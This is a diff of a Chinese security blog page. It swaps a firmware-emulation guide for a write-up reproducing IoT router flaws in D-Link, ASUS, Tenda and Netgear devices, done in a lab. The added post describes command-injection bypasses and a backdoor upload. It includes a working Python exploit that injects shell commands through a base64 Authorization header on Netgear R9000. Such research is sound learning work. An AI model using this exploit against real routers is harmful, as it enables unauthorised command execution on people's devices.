@@ -16,26 +16,26 @@
   <meta name="author" content="korey0sh1">
   <meta name="keywords" content="">
   
-    <meta name="description" content="最折磨的一件事">
+    <meta name="description" content="折磨">
 <meta property="og:type" content="article">
-<meta property="og:title" content="固件模拟指北">
-<meta property="og:url" content="http://example.com/2023/07/30/Fuzz1/index.html">
+<meta property="og:title" content="iot漏洞复现小记">
+<meta property="og:url" content="http://example.com/2023/08/05/iot%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="最折磨的一件事">
+<meta property="og:description" content="折磨">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/img/FW/index.jpg">
-<meta property="article:published_time" content="2023-07-30T13:58:48.000Z">
-<meta property="article:modified_time" content="2023-12-28T14:02:24.297Z">
+<meta property="og:image" content="http://example.com/img/iot1/index.jpg">
+<meta property="article:published_time" content="2023-08-05T00:17:35.000Z">
+<meta property="article:modified_time" content="2024-01-06T00:23:51.156Z">
 <meta property="article:author" content="korey0sh1">
 <meta property="article:tag" content="Iot">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/img/FW/index.jpg">
+<meta name="twitter:image" content="http://example.com/img/iot1/index.jpg">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>固件模拟指北 - Hexo</title>
+  <title>iot漏洞复现小记 - Hexo</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -234,13 +234,13 @@
   
 
 <div id="banner" class="banner" parallax=true
-     style="background: url('/img/FW/banner.jpg') no-repeat center center; background-size: cover;">
+     style="background: url('/img/iot1/banner.jpg') no-repeat center center; background-size: cover;">
   <div class="full-bg-img">
     <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="固件模拟指北"></span>
+            <span id="subtitle" data-typed-text="iot漏洞复现小记"></span>
           
         </div>
 
@@ -256,8 +256,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-07-30 21:58" pubdate>
-          2023年7月30日 晚上
+        <time datetime="2023-08-05 08:17" pubdate>
+          2023年8月5日 早上
         </time>
       </span>
     
@@ -308,12 +308,12 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">固件模拟指北</h1>
+            <h1 id="seo-header">iot漏洞复现小记</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年12月28日 晚上
+                    本文最后更新于：2024年1月6日 早上
                   
                 
               </p>
@@ -321,87 +321,56 @@
             
               <div class="markdown-body">
                 
-                <h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0:写在所有之前"></a>0x0:写在所有之前</h1><p>固件模拟这个玩意笔者也不想多说什么，纯纯的折磨自己，但是还不得不搞（主要是实在是太穷没有米买设备）</p>
-<p>最近把主流的固件模拟方法都过了一遍，于是笔者就想水篇博客顺带记点笔记。</p>
-<p>鉴于固件模拟有各种薛定谔的报错，笔者使用的较为稳定的ubuntu20.04</p>
-<p>🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡🤡</p>
-<h1 id="0x1-框架模拟"><a href="#0x1-框架模拟" class="headerlink" title="0x1:框架模拟"></a>0x1:框架模拟</h1><p>直接工具一把梭哈</p>
-<h2 id="FirmAE-Firmadyne"><a href="#FirmAE-Firmadyne" class="headerlink" title="FirmAE &amp; Firmadyne"></a>FirmAE &amp; Firmadyne</h2><p>这两个没什么好说的，能不能模拟起来纯靠运气</p>
-<p>笔者更倾向于FirmAE一点，主要是懒狗一条，能直接一行command完事的事情谁会想搓一个启动脚本呢</p>
-<p>关于这两个框架的具体信息可以直接在github找</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/pr0v3rbs/FirmAE">pr0v3rbs&#x2F;FirmAE: Towards Large-Scale Emulation of IoT Firmware for Dynamic Analysis (github.com)</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/firmadyne/firmadyne">firmadyne&#x2F;firmadyne: Platform for emulation and dynamic analysis of Linux-based firmware (github.com)</a></p>
-<h2 id="Fact-core"><a href="#Fact-core" class="headerlink" title="Fact_core"></a>Fact_core</h2><p>docker拉了两个小时没拉下来，捏麻麻滴，不做评价</p>
-<h1 id="0x2-Qemu模拟"><a href="#0x2-Qemu模拟" class="headerlink" title="0x2:Qemu模拟"></a>0x2:Qemu模拟</h1><p>有一说一虚拟化真的是个神奇的技术，笔者现在也对<strong>Virtualization</strong>逐渐起了兴趣</p>
-<p>言归正传，qemu模拟有两个不同的模式，user模式和system模式，在本篇博客中，两种模式都会详细介绍</p>
-<h2 id="qemu-user"><a href="#qemu-user" class="headerlink" title="qemu user"></a>qemu user</h2><h3 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h3><p>user模式下模拟较为便捷，这边就以典型的<strong>Tenda AC15</strong>来作为例子<a href="(https://www.tenda.com.cn/download/detail-2680.html)">固件下载</a></p>
-<p>先看一下架构（一般都是查看&#x2F;bin&#x2F;busybox），是arm，小端序，动态链接</p>
-<p>且在&#x2F;bin中存在httpd可执行文件，于是我们就可以尝试运行一下httpd</p>
-<p>首先因为httpd是异架构的动态链接，所以模拟的时候最好直接用静态编译的qemu</p>
-<p>先下载qemu-user-static</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">sudo apt<span class="hljs-operator">-</span><span class="hljs-keyword">get</span> install qemu<span class="hljs-operator">-</span><span class="hljs-keyword">user</span><span class="hljs-operator">-</span><span class="hljs-keyword">static</span><br></code></pre></td></tr></table></figure>
+                <h1 id="0x0-写在所有之前"><a href="#0x0-写在所有之前" class="headerlink" title="0x0: 写在所有之前"></a>0x0: 写在所有之前</h1><p>直接莽漏洞复现了</p>
+<p>搞了个iotsec的账号，这边复现的主要是里面iot靶场里的洞</p>
+<p>总感觉他TM靶机有大问题，所以笔者这记录的全为本地remake</p>
+<h1 id="0x1-大致的漏洞挖掘流程"><a href="#0x1-大致的漏洞挖掘流程" class="headerlink" title="0x1: 大致的漏洞挖掘流程"></a>0x1: 大致的漏洞挖掘流程</h1><p>笔者希望在这二三十个漏洞复现完后能总结出一个高效率的iot漏洞挖掘流程</p>
+<p>但暂时还没什么灵感呜呜呜呜</p>
+<h2 id="Timeline"><a href="#Timeline" class="headerlink" title="Timeline"></a>Timeline</h2><p>8-10，July：试了几个后门漏洞，先用firmwalker看看有没有敏感文件</p>
+<p>10-15，July：挖了totolink T10，熟悉了以mqtt为主题的webserver</p>
+<p>17-20，July：totolink A720R，totolink大量存在的未授权认证漏洞，以及以http为主体的webserver，cstecgi.cgi</p>
+<p>8-13，August：Tenda AX3，patch binary of httpd来启动webserver，很正常的服务</p>
+<p>15-17，August：一系列DLINK设备存在的问题，牵扯到upnp协议，用qemu很麻烦，所以笔者直接用FirmAE进行模拟，且FirmAE的-d模式能拿shell和patch pid调试，对于类似cgi这类存在时间很短的进程，winmt师傅的方法是patch掉一个地方，使程序进入无限循环从而使进程卡住，绝妙的想法！！</p>
+<h1 id="0x2-Remake"><a href="#0x2-Remake" class="headerlink" title="0x2: Remake"></a>0x2: Remake</h1><h2 id="后门漏洞"><a href="#后门漏洞" class="headerlink" title="后门漏洞"></a>后门漏洞</h2><p>这种纯纯就是福利姬（好像有点奇怪，但这么说是一点问题没有）</p>
+<h3 id="D-Link-DIR815后门漏洞"><a href="#D-Link-DIR815后门漏洞" class="headerlink" title="D-Link DIR815后门漏洞"></a>D-Link DIR815后门漏洞</h3><p>拿firmwalker一扫发现存在&#x2F;etc&#x2F;init0.d&#x2F;S80telnetd.sh</p>
+<p><img src="/img/iot1/0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>然后就telnet访问一下就好了</p>
+<p>抽象的一批</p>
+<h3 id="ASUS-RT-N10-ASUS-RT-N10-D1-授权命令执行漏洞"><a href="#ASUS-RT-N10-ASUS-RT-N10-D1-授权命令执行漏洞" class="headerlink" title="ASUS RT-N10&amp;ASUS RT-N10 D1 授权命令执行漏洞"></a>ASUS RT-N10&amp;ASUS RT-N10 D1 授权命令执行漏洞</h3><p>firmwalker扫完没什么发现</p>
+<p>找一下固件中有没有syscmd这种敏感字符串，还真有</p>
+<p><img src="/img/iot1/1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>那用FirmAE模拟一下，试着访问一下这个Main_AdmStatus_Content.asp</p>
+<p><img src="/img/iot1/2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>随便搞</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h3 id="Tenda-AC15命令执行（goform-setUsbUnload）"><a href="#Tenda-AC15命令执行（goform-setUsbUnload）" class="headerlink" title="Tenda AC15命令执行（goform&#x2F;setUsbUnload）"></a>Tenda AC15命令执行（goform&#x2F;setUsbUnload）</h3><p>TendaAC15老朋友了，先把httpd服务起起来</p>
+<p>goform，很眼熟，估计起web服务的是gohead</p>
+<p>漏洞描述都说是在setUsbUnload了，在httpd搜一下字符串</p>
+<p><img src="/img/iot1/3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>啊这，没有任何过滤，那就直接搞个POST请求看一下</p>
+<p><img src="/img/iot1/4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/img/iot1/5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="DIR818L命令执行-（-etc-script-IPV4-INET-PHP）"><a href="#DIR818L命令执行-（-etc-script-IPV4-INET-PHP）" class="headerlink" title="DIR818L命令执行 （&#x2F;etc&#x2F;script&#x2F;IPV4_INET.PHP）"></a>DIR818L命令执行 （&#x2F;etc&#x2F;script&#x2F;IPV4_INET.PHP）</h3><p>捏麻麻滴</p>
+<p>审了半天，看了wp才知道是web洞，会不了一点</p>
+<p>而且这个网路服务是HNAP1，SOAP协议的，xml语言看起来挺好懂得，就是这个功能API实在是太折磨了</p>
+<h3 id="ASUS-RT-N10U-（ping-过滤不严）"><a href="#ASUS-RT-N10U-（ping-过滤不严）" class="headerlink" title="ASUS RT-N10U （ping 过滤不严）"></a>ASUS RT-N10U （ping 过滤不严）</h3><p>好像Ping命令检测网络联通性的地方挺容易出现RCE的</p>
+<p>burp抓个包看看是什么情况</p>
+<p><img src="/img/iot1/6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>？SystemCmd，那就按照特定字符串搜一下，定位到&#x2F;usr&#x2F;sbin&#x2F;httpd，在里面找到了对应的函数</p>
+<p><img src="/img/iot1/7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>sys_script</p>
+<p><img src="/img/iot1/8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>可以看到，用get_cgi接受SystemCmd参数后，虽然有一点过滤。但是反引号**&#96; $()**这些内敛执行绕过并没有过滤掉</p>
+<p>将V7拷贝到位于bss段的SystemCmd后，就直接用sys_script直接执行了，所以就是一个很简单的RCE</p>
+<p>传了个msf生成的backdoor</p>
+<p><img src="/img/iot1/9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="Netgear-R9000（-cgi-bin登录认证时没有对Authorizationg过滤）"><a href="#Netgear-R9000（-cgi-bin登录认证时没有对Authorizationg过滤）" class="headerlink" title="Netgear R9000（&#x2F;cgi-bin登录认证时没有对Authorizationg过滤）"></a>Netgear R9000（&#x2F;cgi-bin登录认证时没有对Authorizationg过滤）</h3><p>登录认证的时候没有对Authorization进行check</p>
+<p>漏洞可以直接定位到&#x2F;usr&#x2F;sbin&#x2F;uhttpd中的<code>uh_cgi_auth_check</code></p>
+<p><img src="/img/iot1/10.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>逻辑很简单，接收到Authorization的内容后，把<code>Basic </code>后的内容base64解密，并把password拼接后执行</p>
+<p>本意是想把password的hash值保存到文件中，却因为过滤不严导致rce</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>url = &quot;http://81.68.182.195:56898/cgi-bin&quot;<br>cmd = base64.b64encode(b&quot;admin:;ls /&gt;/www/cmd.txt;&quot;)<br><br>headers=&#123;<br>    &quot;Host&quot;: &quot;81.68.182.195:56898&quot;,<br>    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,<br>    &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;,<br>    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36&quot;,<br>    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&quot;,<br>    &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,<br>    &quot;Accept-Language&quot;: &quot;en-US,en;q=0.9&quot;,<br>    &quot;Connection&quot;: &quot;keep-alive&quot;,<br>    &quot;Authorization&quot;: b&quot;Basic &quot; + cmd,<br>&#125;<br># payload = &quot;ls &gt;/www/ls.txt&quot;<br># res = requests.<span class="hljs-keyword">get</span>(url=url,auth=(&quot;admin&quot;,payload))<br># print(res.text)<br>res = requests.<span class="hljs-keyword">get</span>(url=url,headers=headers,timeout=<span class="hljs-number">1</span>)<br>print(res.text)<br></code></pre></td></tr></table></figure>
 
-<p>然后找到对应架构的qemu-user-static，复制到当前文件夹下</p>
-<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">which qemu-arm-<span class="hljs-keyword">static</span><br>cp [path <span class="hljs-keyword">to</span> qemu-arm-<span class="hljs-keyword">static</span>] .``<br></code></pre></td></tr></table></figure>
-
-<p>将squashfs-root切换为根目录，user模式执行.&#x2F;bin&#x2F;httpd</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">chroot</span> . ./qemu-arm-static ./bin/httpd<br></code></pre></td></tr></table></figure>
-
-<p>执行了，但没完全执行，但至少我们可以确定这样是有可行性的（yes,we love linux!!!)</p>
-<p><img src="/img/FW/0.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>把httpd拖进ida，根据相应得字符串，看一下是哪边卡住了</p>
-<p>在那边下个断点，然后用IDA远程调式康康什么情况，GDB应该也行</p>
-<p><img src="/img/FW/1.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>单步步进，看到R0寄存器被赋值0，随后就只能跳转到0x2E514，所以使用keypatch来绕过这个这个检测</p>
-<p><img src="/img/FW/2.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/img/FW/3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>再执行看看会怎么样</p>
-<p>又寄了，那就再动调一下</p>
-<p><img src="/img/FW/4.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>可有看到这边又有一个和刚才类似得patch，那就故技重施</p>
-<p><img src="/img/FW/5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p><img src="/img/FW/6.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>再次执行，成功了，但没完全成功，255.255.255.255是给人访问的？那只能继续调了</p>
-<p><img src="/img/FW/7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>可以看到我们前面的两处patch都是为了执行<strong>ConnectCfm</strong>，接下来便是一些变量的获取</p>
-<p>在<strong>GetLanIfName</strong>之后，猜测**GetValue(“lan.ip”, s);**便是导致ip不正常的罪魁祸首</p>
-<p>那就查看一下外部调用<strong>GetLanIfName</strong></p>
-<p><strong>GetLanIfName</strong>被定义在<strong>lib&#x2F;libcommon.so</strong>中，外部调用了<strong>get_eth_name</strong></p>
-<p><img src="/img/FW/11.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>外部调用函数<strong>get_eth_name</strong>被定义<strong>lib&#x2F;libChipApi.so</strong>在中，具体function是获取网卡名称，但是本机中无法匹配与之相应的网卡</p>
-<p><img src="/img/FW/8.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>所以那就起一个名称为<strong>br0</strong>的网卡</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> brctl addbr br0<br><span class="hljs-attribute">sudo</span> ifconfig br0 <span class="hljs-number">192.168.10.144</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
-
-<p>成功！！！</p>
-<p><img src="/img/FW/9.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>访问一下ip试试</p>
-<p>草，访问失败，香槟开早了</p>
-<p><img src="/img/FW/12.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>那就只能在启动的时候加上<strong>–strace</strong>参数看看具体执行过程了</p>
-<p>果然，在访问**&#x2F;webroot&#x2F;main.html**时发生了报错</p>
-<p><img src="/img/FW/13.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>仔细一看webroot这个文件夹是空的，而那些main.html文件全在文件夹webroot_ro中</p>
-<p><img src="/img/FW/14.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>那就只能把webroot给删了，然后创建一个软连接了</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">rm</span> -rf webroot<br>sudo <span class="hljs-built_in">ln</span> -s webroot_ro/ webroot<br></code></pre></td></tr></table></figure>
-
-<p>再访问一下，成功！！</p>
-<p><img src="/img/FW/15.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<h3 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h3><p>这个手法太超前了，等铸币笔者学成归来再说</p>
-<h3 id=""><a href="#" class="headerlink" title=""></a></h3><h2 id="qemu-system"><a href="#qemu-system" class="headerlink" title="qemu system"></a>qemu system</h2><p>这时候就到了全系统模拟了</p>
-<p>winmt👴的文章中有很详细的流程[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_4">原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p>
-<p>王指导用的是ubuntu20，但我只有ubuntu16能成功起起来</p>
-<p>文章中那个镜像的链接好像有点小问题，笔者这边贴一个<a target="_blank" rel="noopener" href="https://files.sboc.dev/images/">images (sboc.dev)</a>，里面还有system模式启动脚本，真的我哭死</p>
-<p>这边还是用Tenda AC15的固件作为示范</p>
-<p>镜像起起来后，保证qemu里的ip能和外网ping通。</p>
-<p>本地开一个http服务或者用scp把squashfs-root传输进去</p>
-<p>使用命令挂载并切换根目录</p>
-<p><img src="/img/FW/16.png" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>接下来便是把patch好的httpd替换掉原本的</p>
-<p>设置网卡了br0，但默认的busybox中不存在brctl指令，github上随便找个编译好的arm架构的busybox传进去就行</p>
-<p>启动httpd</p>
-<p><img src="/img/FW/17.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="/img/iot1/11.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 
                 
               </div>
@@ -447,8 +416,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>固件模拟指北</div>
-      <div>http://example.com/2023/07/30/Fuzz1/</div>
+      <div>iot漏洞复现小记</div>
+      <div>http://example.com/2023/08/05/iot漏洞/</div>
     </div>
     <div class="license-meta">
       
@@ -460,7 +429,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年7月30日</div>
+          <div>2023年8月5日</div>
         </div>
       
       
@@ -492,9 +461,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/08/05/iot%E6%BC%8F%E6%B4%9E/" title="iot漏洞复现小记">
+                      <a href="/2023/08/06/ASAN/" title="Address Sanitizer(投毒？投毒！)">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">iot漏洞复现小记</span>
+                        <span class="hidden-mobile">Address Sanitizer(投毒？投毒！)</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -502,8 +471,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/07/18/fuzz0/" title="dig into the afl">
-                        <span class="hidden-mobile">dig into the afl</span>
+                      <a href="/2023/07/30/Fuzz1/" title="固件模拟指北">
+                        <span class="hidden-mobile">固件模拟指北</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
